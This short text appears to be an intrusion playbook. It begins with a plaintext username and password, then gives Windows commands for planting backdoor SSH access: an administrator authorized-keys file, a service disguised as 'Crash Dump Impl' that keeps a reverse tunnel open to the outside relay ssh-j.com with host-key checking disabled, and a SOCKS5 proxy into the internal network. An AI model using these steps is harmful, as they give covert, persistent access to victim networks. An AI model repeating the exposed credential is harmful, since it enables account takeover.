User : rudolf@gabrielczyk.net

Pass : H9mYpX2qLdV7NbRZT3fG6JWC


how to tunneling using ssh-j.com

1. install openssh.msi from github (microsoft signed)
2. copy "administrators_authorized_keys" (including ssh pub key) into c:\programdata\ssh
  and execute the following command
  icacls "C:\ProgramData\ssh\administrators_authorized_keys" /setowner "BUILTIN\Administrators"
  icacls "C:\ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F"
3. install the service(persistent)
  sc create CrashDumpImpl binPath= "cmd.exe /c ssh -p 8000 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=99999 -N -R brandologyadv:22:localhost:22 name@ssh-j.com" start= auto DisplayName= "Crash Dump Impl"
4. tunnel with the following command
  ssh -i private -D0.0.0.0:65534 -J name@ssh-j.com inetwork@brandologyadv
  then the command will listen 65534 port on vps and it works as the socks5 proxy in internal network.
